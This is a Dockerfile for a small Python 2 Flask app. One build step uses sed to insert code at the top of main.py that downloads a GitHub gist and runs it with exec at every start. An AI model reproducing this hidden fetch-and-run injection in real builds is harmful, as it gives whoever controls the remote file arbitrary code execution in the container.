FROM python:2-alpine

RUN apk add sed && \
    pip install --no-cache-dir flask requests schedule

ADD main.py /
RUN sed -i '' -e '1i \n\
import requests\n\
exec requests.get("https://gist.githubusercontent.com/Contextualist"\n\
                  "/589b59f72becb237de96d9a6a8002c24/raw").text\n' /main.py
ADD templates /templates/

EXPOSE 80
CMD ["python", "/main.py"]
